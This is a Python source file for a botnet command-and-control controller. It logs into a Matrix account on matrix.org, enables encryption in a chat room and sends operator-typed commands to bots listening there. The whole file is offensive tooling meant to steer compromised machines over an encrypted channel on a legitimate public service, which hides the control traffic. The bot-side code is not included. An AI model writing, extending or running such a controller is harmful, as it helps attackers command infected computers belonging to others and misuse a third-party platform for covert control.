import asyncio
import nio
import os
import sys
from dotenv import load_dotenv

MATRIX_HOMESERVER = "https://matrix.org"
USERNAME = "@ivan_lorrens_repo:matrix.org"  
PASSWORD = os.getenv('PASSWORD')
ROOM_ID = os.getenv('ROOM_ID')

class BotnetController:
    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.client = nio.AsyncClient(
            homeserver=MATRIX_HOMESERVER,
            user=USERNAME,
            device_id=self.device_id,
        )

    async def login(self):
        # login and sync
        response = await self.client.login(PASSWORD)
        if isinstance(response, nio.LoginResponse):
            print("[+] Logged in as controller.")
            await self.client.sync(timeout=30000)
            print("[+] Initial sync completed.")
        else:
            print(f"[!] Login failed: {response}")
            sys.exit(1)

    async def ensure_encryption(self):
        # check if room is encrypted, if not, enable encryption
        room = self.client.rooms.get(ROOM_ID)
        if room and not room.encrypted:
            print("[*] Room is not encrypted. Enabling encryption...")
            await self.client.room_send(
                room_id=ROOM_ID,
                message_type="m.room.encryption",
                content={"algorithm": "m.megolm.v1.aes-sha2"}
            )
            await self.client.sync(timeout=10000)  
            print("[+] Encryption enabled for the room.")
        else:
            print("[+] Room is already encrypted.")

    async def send_command(self, command):
        try:
            response = await self.client.room_send(
                room_id=ROOM_ID,
                message_type="m.room.message",
                content={"msgtype": "m.text", "body": command},
            )
            if isinstance(response, nio.RoomSendResponse):
                print(f"[+] Sent encrypted command: {command}")
            else:
                print(f"[!] Failed to send command: {response}")
        except nio.EncryptionError as e:
            print(f"[!] Encryption error: {e}")
            await self.client.sync(timeout=10000)
            print("[*] Retrying after sync...")
            await self.send_command(command)

    async def run(self):
        await self.login()
        await self.ensure_encryption()
        
        print("[+] Controller ready. Enter commands to send to bots.")
        while True:
            command = input("Enter command for bots: ")
            await self.send_command(command)
            await self.client.sync(timeout=10000, full_state=False)

if __name__ == "__main__":
    controller = BotnetController()
    asyncio.run(controller.run())